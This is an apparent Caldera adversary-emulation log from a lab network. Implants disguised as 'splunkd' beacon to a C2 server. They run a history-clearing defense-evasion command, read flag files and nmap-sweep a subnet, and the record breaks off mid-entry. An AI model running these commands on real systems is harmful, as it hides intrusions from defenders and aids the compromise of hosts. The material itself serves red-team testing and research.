{"host_group": [{"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "4514d5ea-ba68-4f70-8568-ecf313a6a276", "decide": "2023-10-03T20:08:52Z", "pid": "1852", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-03T20:08:52Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:08:52Z", "finish": "2023-10-03T20:08:52Z", "id": "4514d5ea-ba68-4f70-8568-ecf313a6a276", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "intern-host", "paw": "wwuzuf"}], "deadman_enabled": true, "ppid": 1, "last_seen": "2023-10-03T20:09:02Z", "sleep_min": 1, "pid": 1201, "proxy_receivers": {}, "sleep_max": 6, "display_name": "intern-host$root", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-03T20:08:52Z", "origin_link_id": "", "location": "/root/splunkd", "exe_name": "splunkd", "watchdog": 0, "trusted": false, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "Elevated", "host": "intern-host", "paw": "wwuzuf", "host_ip_addrs": ["192.168.200.7"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "proxy_chain": []}, {"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "efbdccd8-fc62-49e3-bcd7-06fa24e24d66", "decide": "2023-10-03T20:10:54Z", "pid": "1255", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-03T20:10:54Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:10:54Z", "finish": "2023-10-03T20:10:54Z", "id": "efbdccd8-fc62-49e3-bcd7-06fa24e24d66", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "intern-host", "paw": "piiiry"}], "deadman_enabled": true, "ppid": 1, "last_seen": "2023-10-03T20:22:31Z", "sleep_min": 1, "pid": 1228, "proxy_receivers": {}, "sleep_max": 6, "display_name": "intern-host$root", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-03T20:10:54Z", "origin_link_id": "", "location": "/root/splunkd", "exe_name": "splunkd", "watchdog": 0, "trusted": true, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "Elevated", "host": "intern-host", "paw": "piiiry", "host_ip_addrs": ["192.168.200.7"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "proxy_chain": []}, {"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "2ce854c4-cf9f-4329-8352-0ccf058e7be6", "decide": "2023-10-03T20:14:47Z", "pid": "1872", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-03T20:14:47Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:14:47Z", "finish": "2023-10-03T20:14:47Z", "id": "2ce854c4-cf9f-4329-8352-0ccf058e7be6", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "finance-host", "paw": "hchyiu"}], "deadman_enabled": true, "ppid": 1863, "last_seen": "2023-10-03T20:22:33Z", "sleep_min": 1, "pid": 1868, "proxy_receivers": {}, "sleep_max": 6, "display_name": "finance-host$root", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-03T20:14:47Z", "origin_link_id": "", "location": "/root/splunkd", "exe_name": "splunkd", "watchdog": 0, "trusted": true, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "Elevated", "host": "finance-host", "paw": "hchyiu", "host_ip_addrs": ["192.168.200.5"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "proxy_chain": []}, {"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "f5d3d6c4-64d3-4a99-b1fd-c2ee5128b0e9", "decide": "2023-10-03T20:15:09Z", "pid": "2226", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-03T20:15:09Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:15:09Z", "finish": "2023-10-03T20:15:09Z", "id": "f5d3d6c4-64d3-4a99-b1fd-c2ee5128b0e9", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "ceo-host", "paw": "xuyzjc"}], "deadman_enabled": true, "ppid": 1, "last_seen": "2023-10-03T20:22:30Z", "sleep_min": 1, "pid": 2222, "proxy_receivers": {}, "sleep_max": 6, "display_name": "ceo-host$ceo", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-03T20:15:09Z", "origin_link_id": "", "location": "/home/ceo/sandcat.go", "exe_name": "sandcat.go", "watchdog": 0, "trusted": true, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "User", "host": "ceo-host", "paw": "xuyzjc", "host_ip_addrs": ["192.168.200.4"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "ceo", "proxy_chain": []}, {"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "65ac7c9a-7c61-4b9f-a408-607d9a8181e1", "decide": "2023-10-03T20:15:58Z", "pid": "2278", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-03T20:15:58Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:15:58Z", "finish": "2023-10-03T20:15:58Z", "id": "65ac7c9a-7c61-4b9f-a408-607d9a8181e1", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "activedir-host", "paw": "sucxhr"}], "deadman_enabled": true, "ppid": 1634, "last_seen": "2023-10-03T20:22:33Z", "sleep_min": 1, "pid": 2275, "proxy_receivers": {}, "sleep_max": 6, "display_name": "activedir-host$root", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-03T20:15:58Z", "origin_link_id": "", "location": "/root/splunkd", "exe_name": "splunkd", "watchdog": 0, "trusted": true, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "Elevated", "host": "activedir-host", "paw": "sucxhr", "host_ip_addrs": ["192.168.200.3"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "proxy_chain": []}, {"executors": ["sh", "proc"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "45c1b889-e458-46b4-bfd1-cd739ad65423", "decide": "2023-10-03T20:20:31Z", "pid": "1491", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-03T20:20:31Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:20:31Z", "finish": "2023-10-03T20:20:31Z", "id": "45c1b889-e458-46b4-bfd1-cd739ad65423", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "database-host", "paw": "tvtjgt"}], "deadman_enabled": true, "ppid": 1480, "last_seen": "2023-10-03T20:22:30Z", "sleep_min": 1, "pid": 1487, "proxy_receivers": {}, "sleep_max": 6, "display_name": "database-host$root", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-03T20:20:31Z", "origin_link_id": "", "location": "/root/splunkd", "exe_name": "splunkd", "watchdog": 0, "trusted": true, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "Elevated", "host": "database-host", "paw": "tvtjgt", "host_ip_addrs": ["192.168.201.3"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "proxy_chain": []}], "state": "finished", "start": "2023-10-03T20:12:55Z", "auto_close": true, "use_learning_parsers": true, "autonomous": 1, "planner": {"module": "plugins.deception.app.deception_enterprise", "name": "Deception enterprise planner", "params": {}, "description": "Runs enterprise specific actions", "plugin": "deception", "id": "deception_enterprise", "allow_repeatable_abilities": false, "stopping_conditions": [], "ignore_enforcement_modules": []}, "chain": [{"deadman": false, "finish": "2023-10-03T20:12:57Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "19cc0345-4438-4e04-800e-6fc0748c9a57", "plaintext_command": "ls -l /home", "used": [{"trait": "host.dir.path", "links": ["19cc0345-4438-4e04-800e-6fc0748c9a57", "05fa8018-1547-4fba-9952-17d7b6f03be9", "cccc83db-77f8-4bc0-9e57-20508952a595", "54ad2d75-1d24-4e29-ab32-8b4b75ca53a9", "aef8deca-9157-4857-b53b-aeac14bae25e"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:12:55Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['finance'])", "host.dir.path(/home) : has_contents : host.dir.children(['ceo'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])", "host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}], "unique": "19cc0345-4438-4e04-800e-6fc0748c9a57", "decide": "2023-10-03T20:12:55Z", "status": 0, "score": 1, "pid": "1793", "relationships": [{"target": {"trait": "host.dir.children", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["intern"], "unique": "host.dir.children['intern']", "created": "2023-10-03T20:12:57Z", "relationships": []}, "source": {"trait": "host.dir.path", "links": ["19cc0345-4438-4e04-800e-6fc0748c9a57", "05fa8018-1547-4fba-9952-17d7b6f03be9", "cccc83db-77f8-4bc0-9e57-20508952a595", "54ad2d75-1d24-4e29-ab32-8b4b75ca53a9", "aef8deca-9157-4857-b53b-aeac14bae25e"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:12:55Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['finance'])", "host.dir.path(/home) : has_contents : host.dir.children(['ceo'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])", "host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208bac50>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe7208d4160>", "score": 1}], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-ls", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.dir.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.children"}]}], "buckets": ["utility"], "technique_name": "Deception Enum Folders"}, "agent_reported_time": "2023-10-03T20:12:57Z", "command": "ls -l /home", "facts": [{"trait": "host.dir.path", "links": ["19cc0345-4438-4e04-800e-6fc0748c9a57", "05fa8018-1547-4fba-9952-17d7b6f03be9", "cccc83db-77f8-4bc0-9e57-20508952a595", "54ad2d75-1d24-4e29-ab32-8b4b75ca53a9", "aef8deca-9157-4857-b53b-aeac14bae25e"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 6, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-03T20:12:55Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['finance'])", "host.dir.path(/home) : has_contents : host.dir.children(['ceo'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])", "host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}, {"trait": "host.dir.children", "links": ["19cc0345-4438-4e04-800e-6fc0748c9a57"], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": "T9012", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["intern"], "unique": "host.dir.children['intern']", "created": "2023-10-03T20:12:57Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:12:57Z"}, {"deadman": false, "finish": "2023-10-03T20:13:03Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "715c84f1-e69a-4c44-85c8-91afe6163950", "plaintext_command": "cat /home/intern/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home/intern/flag.txt", "unique": "host.file.path/home/intern/flag.txt", "created": "2023-10-03T20:13:00Z", "relationships": []}], "unique": "715c84f1-e69a-4c44-85c8-91afe6163950", "decide": "2023-10-03T20:13:00Z", "status": 1, "score": 1, "pid": "1795", "relationships": [], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-03T20:13:03Z", "command": "cat /home/intern/flag.txt", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:13:03Z"}, {"deadman": false, "finish": "2023-10-03T20:13:10Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "303b732a-60f0-468f-93c0-aa48ad8d47c1", "plaintext_command": "cat /root/flag.txt", "used": [{"trait": "host.file.path", "links": ["5bcb3960-cc39-4bc8-b34f-59eeb0f64d39", "d8464326-17de-4a78-9d18-c84ce550a37b"], "collected_by": ["piiiry", "hchyiu", "tvtjgt"], "score": 3, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-03T20:13:05Z", "relationships": ["host.file.path(/root/flag.txt) : has_contents : host.file.contents(RSFUG7QFN354XFQOVAJCCL230YP3EY1Q)", "host.file.path(/root/flag.txt) : has_contents : host.file.contents(Y304GQRQKHK63BNJSPHGQAVORNG65LNH)"]}], "unique": "303b732a-60f0-468f-93c0-aa48ad8d47c1", "decide": "2023-10-03T20:13:05Z", "status": 1, "score": 1, "pid": "1797", "relationships": [], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-03T20:13:10Z", "command": "cat /root/flag.txt", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:13:10Z"}, {"deadman": false, "finish": "2023-10-03T20:13:23Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "b50f077a-e985-4058-aa9f-c3a1f23ab450", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "scan.subnet.addr192.168.200.0/24", "created": "2023-10-03T20:13:10Z", "relationships": []}], "unique": "b50f077a-e985-4058-aa9f-c3a1f23ab450", "decide": "2023-10-03T20:13:10Z", "status": 0, "score": 1, "pid": "1799", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7']", "created": "2023-10-03T20:13:23Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-03T20:13:23Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208a0880>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe7208a0d60>", "score": 1}], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": 